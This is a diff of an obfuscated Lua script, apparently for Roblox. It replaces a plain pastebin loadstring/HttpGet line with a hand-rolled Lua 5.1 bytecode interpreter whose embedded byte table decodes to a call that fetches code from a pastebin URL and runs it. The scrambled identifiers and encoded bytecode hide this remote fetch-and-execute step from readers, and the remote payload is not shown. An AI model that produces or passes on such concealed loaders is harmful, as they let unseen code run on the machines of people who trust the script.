@@ -1,5 +1,662 @@
--- This file was generated using Luraph Obfuscator v13.4.4
+--// This script was obfuscated with Custom Lua Encryption Version v2.5-beta by 1store
 
----return (function(hH,mH,BH,bH,EH,zH,OH,XB,JH,KH,l21763796C960BAE75ECAE7F59422H597BE4BD2E5F63CFD4A98F7F9A413C1A7F851E63457FD00B2H107BBBB98A157C461C06848B3H31B117BC66FC8775A7BE7DD242F2B21C72171D419D1F1DE8F42HE81C530F2H5393DE852E133C49D54809163H54D4177F63383F164A56F1CA7F75E92HF57BC08F12FD22EBB7732B7F36C4887296A1FCF5E1093H2C14442H179722443HA2BD44CD4D2HB317D8838D98164398C9350B0E4ECF721739A639AE440444B17B172F0EB2EF7FBA5B2H7A7BA5EF7888677052F05844DB5B0DA41766AEFD4342D18A8491169C4716EA0B3HC747171209555216FDE6597D7FC8532H487B73CB8FB02C7E259ABE7F69A930E917F4AFA1B4169F1F14E4176AB67E2A1615899A6D0B3H20A017CBD78C8B2H16CAB0967F815D19417F8CCC710D1737AC6177162H02178217EDF64E2D7FB86378F91563E3D21E172EB5A1580B3H199917243F636416CF542H4F7F5AC12HDA7BC515F96865108BF6D07F3B272H3B7F465A2H467B717604CC847C601A3C7F67BCA7258B3HB232179DC65DCB75E8ECB31D4253C80513163H1E9E178992CEC91654CFDB220B7FA4D9FF7F4AD1D48A7F75AE2HB57B40E8554745EBB7CDEB7FF6EA2HF67BA1F61A910AACB0B2EC7F974C57D58B3H62E217CD960DFD75181C43964283C71348978E3E70FC962H79B5021784013D1397EFB63DD32F3ABA7E4617E5FE41657FB02B2H307B1B1AD07C1F663D82A67F51D1502E175C038C9C0987C7EEF817520EE32A0B3D7DFE4217485388095A3H73F3173E657EDC75697268380B3H74F4171F04585F16AA310FDC4D2H15419517A07B60E1153H4BCB17164D56267541439A8F420CD7094C163H37B7178299C5C216AD3622DB0B38E3F8B87FA3382H237BEE095B8D27198299D97F64BFA425153H0F7217DA01FF9A16C585CDBE17D091D44197BB609EFB163H068617F1EAB6B116BCE70CCA0B3HE767173229757216DD467AAB0B3H68E8179388D4D3169E9FC53E422H8990F717940F1BE20B3FE499BF7FCA512H4A7BB5D34B2966809B73407F6BB02HAB7B369338760E613D47617FEC709FAC7FD78B2H977BE244951E630DD6CD4F8B1858F96417C3A1B183090EEF8E8C1DB9187339163H840417EF0E686F163A1BA3FA7F25A5765A17F0AFF0F21D3H5BDB176679667175110E5B11161C431C5C7FC7B3F9069612CDF9D2092HFD748317C854ECC87F33A0200BDC787CA47172HA4A92417E121ED61177EBE2H7E097BBB7A7B162HD8DAD87F95D52CE4352HB289C435EFBB2B08750C1EB06E21897AADDB57662D064944238EA50357C08BE443243DA24164735A73254A2CD7C03C2F292H747DF41731A32A945C0E3H4E2A0B4B8B4B0B3HA8281725A5646516C28202821E3HFF7F179C1CDDDC16592H19185C760332DC2F33B3F3B20B3H1090174D0DCCCD162H6AAAEB4D3H67E717C444C445438157BFAB962H1EE161175B3H1B2A3H78F81775F53435162H1293520B3HCF4F17EC6CADAC16A9E969E91E063H862A0383C3820B602HA0E10B1D5DDD9C4D2HBABB3A17B777B7365A3H149417D12H518D756E3HEE2AEB6B1294174877DA342F2H05FB7A17623H222A3H9F1F173CBC7D7C16F9B979B90B3H56D6171393525316F0B071B04DAD3H6D44CA2H0A8B15473H077B3HE4641721E1D25E17FE3HBE2A3HBB3B1758D81918162H9514D50BB2F233F24DAFBA5145964CCC4CCC17C93H897B2666D75917236323A317C02H0081153DBDC342175A9AAE25174H005B9201023B0356542B9D0A020019B43D053H0002BC1ACA97012H00E0960A02003FD757D45717367635B6172HB5B6351754942H540913932H1316F2322HF27FF171C881352H10AB6435CF6B4D017AAED932CD096DFEE114634C650A2F45CBB8362063EA94AB2C1769E1E8F176484F5A74794HC7163H26A617A5252HA5164404C444383H0383172HE26217754HE11C5H00BF2DA41A5C4H00B3620005F5F894607DA10A0200591F3D063H00998B17C347433D043H00A39D28253D073H009F13AC165345273D073H00CC9B461D20EA433D043H0081636F43022H0033BE0A0200372H9E941E1715D51C9517AC2CA52C1763236263093ABA3B3A1631F130317F4888703A357FFFC50B3556CDD1ED0A0DDFE3B17AA4328ED4659BE33CAF17721CE21A6D69E3818F33809C9A4135F7B875C8442H0E088E1705C545853C1CDCE36317533HD37B2HAAAE2A172HA1AB2117382A8D9D2FEF3951C596C646C647433DBD3DBD2A3H54D4172H8B0A0B16223HE2442HD927A6172HB030F0872H2722A7177E3E7AFE17753HF52A3H8C0C172HC34243162H1AE66517913H115DA86CA420755F1FA42017B6764BC917AD3FB6085C44C485C44D7B7A2H7B7F5292AD2D173HC948153H60E02H172H97DE756E3HEE7B65E59C1A17FC7C068317B32H73B33B8A4A72F517013H8 
-loadstring(game:HttpGet('https://pastebin.com/raw/eQx7UPXW'))()
- ---return (function(hH,mH,BH,bH,EH,zH,OH,XB,JH,K[HV[2]]=F0[bb+1];end;else T0[HV[2]]=HV[10]>=HV[5
+local llIIlIlIIllllIlIlIlIIlIlIlIllllIllI = {'\27','\76','\117','\97','\81','\0','\1','\4','\8','\4','\8','\0','\7','\0',
+'\0','\0','\0','\0','\0','\0','\60','\101','\118','\97','\108','\62','\0','\3','\0','\0','\0','\8','\0','\0','\0','\0','\0',
+'\0','\4','\8','\0','\0','\0','\5','\0','\0','\0','\69','\64','\0','\0','\75','\128','\192','\0','\193','\192','\0','\0',
+'\92','\0','\128','\1','\28','\128','\0','\0','\28','\64','\128','\0','\30','\0','\128','\0','\4','\0','\0','\0','\4','\11',
+'\0','\0','\0','\0','\0','\0','\0','\108','\111','\97','\100','\115','\116','\114','\105','\110','\103','\0','\4','\5','\0',
+'\0','\0','\0','\0','\0','\0','\103','\97','\109','\101','\0','\4','\8','\0','\0','\0','\0','\0','\0','\0','\72','\116','\116',
+'\112','\71','\101','\116','\0','\4','\34','\0','\0','\0','\0','\0','\0','\0','\104','\116','\116','\112','\115','\58','\47',
+'\47','\112','\97','\115','\116','\101','\98','\105','\110','\46','\99','\111','\109','\47','\114','\97','\119','\47','\85',
+'\110','\116','\110','\75','\85','\87','\106','\0','\0','\0','\0','\0','\8','\0','\0','\0','\5','\0','\0','\0','\5','\0',
+'\0','\0','\5','\0','\0','\0','\5','\0','\0','\0','\5','\0','\0','\0','\5','\0','\0','\0','\5','\0','\0','\0','\8','\0','\0',
+'\0','\0','\0','\0','\0','\0','\0','\0','\0'}
+
+local IlIIlIlIIIlllIlIlIIlIlIlIlIIIlIIIII = {
+"ABC",  "ABx", "ABC",  "ABC",
+"ABC",  "ABx", "ABC",  "ABx", 
+"ABC",  "ABC", "ABC",  "ABC",
+"ABC",  "ABC", "ABC",  "ABC",
+"ABC",  "ABC", "ABC",  "ABC",
+"ABC",  "ABC", "AsBx", "ABC",
+"ABC",  "ABC", "ABC",  "ABC",
+"ABC",  "ABC", "ABC",  "AsBx",
+"AsBx", "ABC", "ABC", "ABC",
+"ABx",  "ABC",}
+local llllIIlIllIIlIllIIllIlIlIIlIIIllIlI = {
+"MOVE",     "LOADK",     "LOADBOOL", "LOADNIL",
+"GETUPVAL", "GETGLOBAL", "GETTABLE", "SETGLOBAL",
+"SETUPVAL", "SETTABLE",  "NEWTABLE", "SELF",
+"ADD",      "SUB",       "MUL",      "DIV",
+"MOD",      "POW",       "UNM",      "NOT",
+"LEN",      "CONCAT",    "JMP",      "EQ",
+"LT",       "LE",        "TEST",     "TESTSET",
+"CALL",     "TAILCALL",  "RETURN",   "FORLOOP",
+"FORPREP",  "TFORLOOP",  "SETLIST",  "CLOSE",
+"CLOSURE",  "VARARG"
+};
+local function get_bits(input, n, n2)
+if n2 then
+local total = 0
+local digitn = 0
+for i = n, n2 do
+total = total + 2^digitn*get_bits(input, i)
+digitn = digitn + 1
+end
+return total
+else
+local pn = 2^(n-1)
+return (input % (pn + pn) >= pn) and 1 or 0
+end
+end
+local function lIlIIIlllIlIIIIlIIIllIlIIIIIlIlIlll(IlIlllllllIllIlIllIlIlllIIIIIlIIlll)
+local index = 1
+local big_endian = false
+local int_size;
+local size_t;
+local get_int, get_size_t;
+local get_int8, get_int32, get_int64, get_float64, get_string;
+do
+function get_int8()
+local a = IlIlllllllIllIlIllIlIlllIIIIIlIIlll:byte(index, index);
+index = index + 1
+return a
+end
+function get_int32()
+local a, b, c, d = IlIlllllllIllIlIllIlIlllIIIIIlIIlll:byte(index, index + 3);
+index = index + 4;
+return d*16777216 + c*65536 + b*256 + a
+end
+function get_int64()
+local a = get_int32();
+local b = get_int32();
+return b*4294967296 + a;
+end
+function get_float64()
+local a = get_int32()
+local b = get_int32()
+return (-2*get_bits(b, 32)+1)*(2^(get_bits(b, 21, 31)-1023))*
+((get_bits(b, 1, 20)*(2^32) + a)/(2^52)+1)
+end
+function get_string(len)
+local str;
+if len then
+str = IlIlllllllIllIlIllIlIlllIIIIIlIIlll:sub(index, index + len - 1);
+index = index + len;
+else
+len = get_size_t();
+if len == 0 then return; end
+str = IlIlllllllIllIlIllIlIlllIIIIIlIIlll:sub(index, index + len - 1);
+index = index + len;
+end
+return str;
+end
+end
+local function decode_chunk()
+local chunk;
+local instructions = {};
+local constants    = {};
+local prototypes   = {};
+local debug = {
+lines = {};
+};
+chunk = {
+instructions = instructions;
+constants    = constants;
+prototypes   = prototypes;
+debug = debug;
+};
+local num;
+chunk.name       = get_string();
+chunk.first_line = get_int();
+chunk.last_line  = get_int();
+if chunk.name then chunk.name = chunk.name:sub(1, -2); end
+chunk.upvalues  = get_int8();
+chunk.arguments = get_int8();
+chunk.varg      = get_int8();
+chunk.stack     = get_int8();
+do
+num = get_int();
+for i = 1, num do
+local instruction = {
+};
+local llIIlIlIIllllIlIlIlIIlIlIlIllllIllI   = get_int32();
+local opcode = get_bits(llIIlIlIIllllIlIlIlIIlIlIlIllllIllI, 1, 6);
+local type   = IlIIlIlIIIlllIlIlIIlIlIlIlIIIlIIIII[opcode + 1];
+instruction.opcode = opcode;
+instruction.type   = type;
+instruction.A = get_bits(llIIlIlIIllllIlIlIlIIlIlIlIllllIllI, 7, 14);
+if type == "ABC" then
+instruction.B = get_bits(llIIlIlIIllllIlIlIlIIlIlIlIllllIllI, 24, 32);
+instruction.C = get_bits(llIIlIlIIllllIlIlIlIIlIlIlIllllIllI, 15, 23);
+elseif type == "ABx" then
+instruction.Bx = get_bits(llIIlIlIIllllIlIlIlIIlIlIlIllllIllI, 15, 32);
+elseif type == "AsBx" then
+instruction.sBx = get_bits(llIIlIlIIllllIlIlIlIIlIlIlIllllIllI, 15, 32) - 131071;
+end
+instructions[i] = instruction;
+end
+end
+do
+num = get_int();
+for i = 1, num do
+local constant = {
+};
+local type = get_int8();
+constant.type = type;
+if type == 1 then
+constant.llIIlIlIIllllIlIlIlIIlIlIlIllllIllI = (get_int8() ~= 0);
+elseif type == 3 then
+constant.llIIlIlIIllllIlIlIlIIlIlIlIllllIllI = get_float64();
+elseif type == 4 then
+constant.llIIlIlIIllllIlIlIlIIlIlIlIllllIllI = get_string():sub(1, -2);
+end
+constants[i-1] = constant;
+end
+end
+do
+num = get_int();
+for i = 1, num do
+prototypes[i-1] = decode_chunk();
+end
+end
+do
+local llIIlIlIIllllIlIlIlIIlIlIlIllllIllI = debug.lines
+num = get_int();
+for i = 1, num do
+llIIlIlIIllllIlIlIlIIlIlIlIllllIllI[i] = get_int32();
+end
+num = get_int();
+for i = 1, num do
+get_string():sub(1, -2);
+get_int32();
+get_int32();
+end
+num = get_int();
+for i = 1, num do
+get_string();
+end
+end
+return chunk;
+end
+do
+assert(get_string(4) == "\27Lua", "S1MPLYS3C7RED: Bytecode expected");
+assert(get_int8() == 0x51, "S1MPLYS3C7RED: Only lua5.1 is supported");
+get_int8();
+big_endian = (get_int8() == 0);
+int_size = get_int8();
+size_t   = get_int8();
+if int_size == 4 then
+get_int = get_int32;
+elseif int_size == 8 then
+get_int = get_int64;
+else
+error("");
+end
+if size_t == 4 then
+get_size_t = get_int32;
+elseif size_t == 8 then
+get_size_t = get_int64;
+else
+error("");
+end
+assert(get_string(3) == "\4\8\0","S1MPLYS3C7RED: Unsupported platform");
+end
+return decode_chunk();
+end
+local function handle_return(...)
+local c = select("#", ...)
+local t = {...}
+return c, t
+end
+local function IIllIllIlIIIIIIIIllIlIIIIlllIIIIIIl(IIllIlIIIlIlllllIIIlIIlllllIllllIlI, upvalues)
+local instructions = IIllIlIIIlIlllllIIIlIIlllllIllllIlI.instructions;
+local constants    = IIllIlIIIlIlllllIIIlIIlllllIllllIlI.constants;
+local prototypes   = IIllIlIIIlIlllllIIIlIIlllllIllllIlI.prototypes;
+
+local stack, top
+local environment
+local IP = 1;
+local vararg, vararg_size 
+
+local opcode_funcs = {
+[0]  = function(instruction)
+stack[instruction.A] = stack[instruction.B];
+end,
+[1]  = function(instruction)
+stack[instruction.A] = constants[instruction.Bx].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI;
+end,
+[2]  = function(instruction)
+stack[instruction.A] = instruction.B ~= 0
+if instruction.C ~= 0 then
+IP = IP + 1
+end
+end,
+[3]  = function(instruction)
+local stack = stack
+for i = instruction.A, instruction.B do
+stack[i] = nil
+end
+end,
+[4] = function(instruction)
+stack[instruction.A] = upvalues[instruction.B]
+end,
+[5]  = function(instruction)
+local key = constants[instruction.Bx].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI;
+stack[instruction.A] = environment[key];
+end,
+[6]  = function(instruction)
+local C = instruction.C
+local stack = stack
+C = C > 255 and constants[C-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[C]
+stack[instruction.A] = stack[instruction.B][C];
+end,
+[7]  = function(instruction)
+local key = constants[instruction.Bx].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI;
+environment[key] = stack[instruction.A];
+end,
+[8] = function (instruction)
+upvalues[instruction.B] = stack[instruction.A]
+end,
+[9] = function (instruction)
+local B = instruction.B;
+local C = instruction.C;
+local stack, constants = stack, constants;
+B = B > 255 and constants[B-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[B];
+C = C > 255 and constants[C-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[C];
+stack[instruction.A][B] = C
+end,
+[10] = function (instruction)
+stack[instruction.A] = {}
+end,
+[11] = function (instruction)
+local A = instruction.A
+local B = instruction.B
+local C = instruction.C
+local stack = stack
+B = stack[B]
+C = C > 255 and constants[C-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[C]
+stack[A+1] = B
+stack[A]   = B[C]
+end,
+[12] = function(instruction)
+local B = instruction.B;
+local C = instruction.C;
+local stack, constants = stack, constants;
+B = B > 255 and constants[B-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[B];
+C = C > 255 and constants[C-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[C];
+stack[instruction.A] = B+C;
+end,
+[13] = function(instruction)
+local B = instruction.B;
+local C = instruction.C;
+local stack, constants = stack, constants;
+B = B > 255 and constants[B-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[B];
+C = C > 255 and constants[C-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[C];
+stack[instruction.A] = B - C;
+end,
+[14] = function(instruction)
+local B = instruction.B;
+local C = instruction.C;
+local stack, constants = stack, constants;
+B = B > 255 and constants[B-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[B];
+C = C > 255 and constants[C-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[C];
+stack[instruction.A] = B * C;
+end,
+[15] = function(instruction)
+local B = instruction.B;
+local C = instruction.C;
+local stack, constants = stack, constants;
+B = B > 255 and constants[B-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[B];
+C = C > 255 and constants[C-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[C];
+stack[instruction.A] = B / C;
+end,
+[16] = function(instruction)
+local B = instruction.B;
+local C = instruction.C;
+local stack, constants = stack, constants;
+B = B > 255 and constants[B-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[B];
+C = C > 255 and constants[C-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[C];
+stack[instruction.A] = B % C;
+end,
+[17] = function(instruction)
+local B = instruction.B;
+local C = instruction.C;
+local stack, constants = stack, constants;
+B = B > 255 and constants[B-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[B];
+C = C > 255 and constants[C-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[C];
+stack[instruction.A] = B ^ C;
+end,
+[18] = function(instruction)
+stack[instruction.A] = -stack[instruction.B]
+end,
+[19] = function(instruction)
+stack[instruction.A] = not stack[instruction.B]
+end,
+[20] = function(instruction)
+stack[instruction.A] = #stack[instruction.B]
+end,
+[21] = function(instruction)
+local B = instruction.B
+local result = stack[B]
+for i = B+1, instruction.C do
+result = result .. stack[i] 
+end
+stack[instruction.A] = result
+end,
+[22] = function(instruction)
+IP = IP + instruction.sBx
+end,
+[23] = function(instruction)
+local A = instruction.A
+local B = instruction.B
+local C = instruction.C
+local stack, constants = stack, constants
+A = A ~= 0
+B = B > 255 and constants[B-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[B]
+C = C > 255 and constants[C-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[C]
+if (B == C) ~= A then
+IP = IP + 1
+end
+end,
+[24] = function(instruction)
+local A = instruction.A
+local B = instruction.B
+local C = instruction.C
+local stack, constants = stack, constants
+A = A ~= 0
+B = B > 255 and constants[B-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[B]
+C = C > 255 and constants[C-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[C]
+if (B < C) ~= A then
+IP = IP + 1
+end
+end,
+[25] = function(instruction)
+local A = instruction.A
+local B = instruction.B
+local C = instruction.C
+local stack, constants = stack, constants
+A = A ~= 0
+B = B > 255 and constants[B-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[B]
+C = C > 255 and constants[C-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or stack[C]
+if (B <= C) ~= A then
+IP = IP + 1
+end
+end,
+[26] = function(instruction)
+if stack[instruction.A] == (instruction.C ~= 0) then
+IP = IP + 1
+end
+end,
+[27] = function(instruction)
+local stack = stack
+local B = stack[instruction.B]
+if B == (instruction.C ~= 0) then
+IP = IP + 1
+else
+stack[instruction.A] = B
+end
+end,
+[28] = function(instruction)
+local A = instruction.A;
+local B = instruction.B;
+local C = instruction.C;
+local stack = stack;
+local args, results;
+local limit, loop
+args = {};
+if B ~= 1 then
+if B ~= 0 then
+limit = A+B-1;
+else
+limit = top
+end
+loop = 0
+for i = A+1, limit do
+loop = loop + 1
+args[loop] = stack[i];
+end
+limit, results = handle_return(stack[A](unpack(args, 1, limit-A)))
+else
+limit, results = handle_return(stack[A]())
+end
+top = A - 1
+if C ~= 1 then
+if C ~= 0 then
+limit = A+C-2;
+else
+limit = limit+A
+end
+loop = 0;
+for i = A, limit do
+loop = loop + 1;
+stack[i] = results[loop];
+end
+end
+end,
+[29] = function (instruction)
+local A = instruction.A;
+local B = instruction.B;
+local C = instruction.C;
+local stack = stack;
+local args, results;
+local top, limit, loop = top
+args = {};
+if B ~= 1 then
+if B ~= 0 then
+limit = A+B-1;
+else
+limit = top
+end
+loop = 0
+for i = A+1, limit do
+loop = loop + 1
+args[#args+1] = stack[i];
+end
+results = {stack[A](unpack(args, 1, limit-A))};
+else
+results = {stack[A]()};
+end
+return true, results
+end,
+[30] = function(instruction)
+local A = instruction.A;
+local B = instruction.B;
+local stack = stack;
+local limit;
+local loop, IlllIlIIIIIlIIIlIllIIIIlIllIllIlIlI;
+if B == 1 then
+return true;
+end
+if B == 0 then
+limit = top
+else
+limit = A + B - 2;
+end
+IlllIlIIIIIlIIIlIllIIIIlIllIllIlIlI = {};
+local loop = 0
+for i = A, limit do
+loop = loop + 1
+IlllIlIIIIIlIIIlIllIIIIlIllIllIlIlI[loop] = stack[i];
+end
+return true, IlllIlIIIIIlIIIlIllIIIIlIllIllIlIlI;
+end,
+[31] = function(instruction)
+local A = instruction.A
+local stack = stack
+local step = stack[A+2]
+local index = stack[A] + step 
+stack[A] = index
+if step > 0 then
+if index <= stack[A+1] then
+IP = IP + instruction.sBx
+stack[A+3] = index
+end
+else
+if index >= stack[A+1] then
+IP = IP + instruction.sBx
+stack[A+3] = index
+end
+end
+end,
+[32] = function(instruction)
+local A = instruction.A
+local stack = stack
+stack[A] = stack[A] - stack[A+2]
+IP = IP + instruction.sBx 
+end,
+[33] = function(instruction)
+local A = instruction.A
+local B = instruction.B
+local C = instruction.C
+local stack = stack
+local offset = A+2
+local result = {stack[A](stack[A+1], stack[A+2])}
+for i = 1, C do
+stack[offset+i] = result[i]
+end
+if stack[A+3] ~= nil then
+stack[A+2] = stack[A+3]
+else
+IP = IP + 1
+end
+end,
+[34] = function(instruction)
+local A = instruction.A
+local B = instruction.B
+local C = instruction.C
+local stack = stack
+if C == 0 then
+error("NYI: extended SETLIST")
+else
+local offset = (C - 1) * 50
+local t = stack[A]
+if B == 0 then
+B = top
+end
+for i = 1, B do
+t[offset+i] = stack[A+i]
+end
+end
+end,
+[35] = function(instruction)
+io.stderr:write("NYI: CLOSE")
+io.stderr:flush()
+end,
+[36] = function(instruction)
+local proto = prototypes[instruction.Bx]
+local instructions = instructions
+local stack = stack
+local indices = {}
+local new_upvals = setmetatable({},
+{
+__index = function(t, k)
+local upval = indices[k]
+return upval.segment[upval.offset]
+end,
+__newindex = function(t, k, v)
+local upval = indices[k]
+upval.segment[upval.offset] = v
+end
+}
+)
+for i = 1, proto.upvalues do
+local movement = instructions[IP]
+if movement.opcode == 0 then
+indices[i-1] = {segment = stack, offset = movement.B}
+elseif instructions[IP].opcode == 4 then
+indices[i-1] = {segment = upvalues, offset = movement.B}
+end
+IP = IP + 1
+end
+local _, func = IIllIllIlIIIIIIIIllIlIIIIlllIIIIIIl(proto, new_upvals)
+stack[instruction.A] = func
+end,
+[37] = function(instruction)
+local A = instruction.A
+local B = instruction.B
+local stack, vararg = stack, vararg
+
+for i = A, A + (B > 0 and B - 1 or vararg_size) do
+stack[i] = vararg[i - A]
+end
+end,
+}
+local function loop()
+local instructions = instructions
+local instruction, a, b
+while true do
+instruction = instructions[IP];
+IP = IP + 1
+a, b = opcode_funcs[instruction.opcode](instruction);
+if a then
+return b;
+end
+end
+end
+local IIIIIIIlIlIIlllIIlIlIIIllIIlIIIlIlI = {
+get_stack = function()
+return stack;
+end;
+get_IP = function()
+return IP;
+end
+};
+local function func(...)
+local local_stack = {};
+local ghost_stack = {};
+top = -1
+stack = setmetatable(local_stack, {
+__index = ghost_stack;
+__newindex = function(t, k, v)
+if k > top and v then
+top = k
+end
+ghost_stack[k] = v
+end;
+})
+local args = {...};
+vararg = {}
+vararg_size = select("#", ...) - 1
+for i = 0, vararg_size do
+local_stack[i] = args[i+1];
+vararg[i] = args[i+1]
+end
+environment = getfenv();
+IP = 1;
+local thread = coroutine.create(loop)
+local a, b = coroutine.resume(thread)
+if a then
+if b then
+return unpack(b);
+end
+return;
+else
+local name = IIllIlIIIlIlllllIIIlIIlllllIllllIlI.name;
+local line = IIllIlIIIlIlllllIIIlIIlllllIllllIlI.debug.lines[IP];
+local err  = b:gsub("(.-:)", "");
+local IlllIlIIIIIlIIIlIllIIIIlIllIllIlIlI = "";
+IlllIlIIIIIlIIIlIllIIIIlIllIllIlIlI = IlllIlIIIIIlIIIlIllIIIIlIllIllIlIlI .. (name and name .. ":" or "");
+IlllIlIIIIIlIIIlIllIIIIlIllIllIlIlI = IlllIlIIIIIlIIIlIllIIIIlIllIllIlIlI .. (line and line .. ":" or "");
+IlllIlIIIIIlIIIlIllIIIIlIllIllIlIlI = IlllIlIIIIIlIIIlIllIIIIlIllIllIlIlI .. b
+error(IlllIlIIIIIlIIIlIllIIIIlIllIllIlIlI, 0);
+end
+end
+return IIIIIIIlIlIIlllIIlIlIIIllIIlIIIlIlI, func;
+end
+local lIlIlIlIlIllIIIllIlIIlllIIlllIlIIII = {
+IlIIIIIIlIllIIlIlIIIllIllIIlllIllll = function(IlIlllllllIllIlIllIlIlllIIIIIlIIlll)
+local IIllIlIIIlIlllllIIIlIIlllllIllllIlI = lIlIIIlllIlIIIIlIIIllIlIIIIIlIlIlll(IlIlllllllIllIlIllIlIlllIIIIIlIIlll);
+local _, func = IIllIllIlIIIIIIIIllIlIIIIlllIIIIIIl(IIllIlIIIlIlllllIIIlIIlllllIllllIlI);
+return func;
+end;
+utils = {
+lIlIIIlllIlIIIIlIIIllIlIIIIIlIlIlll = lIlIIIlllIlIIIIlIIIllIlIIIIIlIlIlll;
+IIllIllIlIIIIIIIIllIlIIIIlllIIIIIIl = IIllIllIlIIIIIIIIllIlIIIIlllIIIIIIl;
+IlllIIIllIlllIlIIIllllIIllllIIllllI = function(IlIlllllllIllIlIllIlIlllIIIIIlIIlll)
+local IIllIlIIIlIlllllIIIlIIlllllIllllIlI = lIlIIIlllIlIIIIlIIIllIlIIIIIlIlIlll(IlIlllllllIllIlIllIlIlllIIIIIlIIlll)
+return IIllIllIlIIIIIIIIllIlIIIIlllIIIIIIl(IIllIlIIIlIlllllIIIlIIlllllIllllIlI);
+end;
+};
+}
+lIlIlIlIlIllIIIllIlIIlllIIlllIlIIII.IlIIIIIIlIllIIlIlIIIllIllIIlllIllll(table.concat(llIIlIlIIllllIlIlIlIIlIlIlIllllIllI, [[]]))()
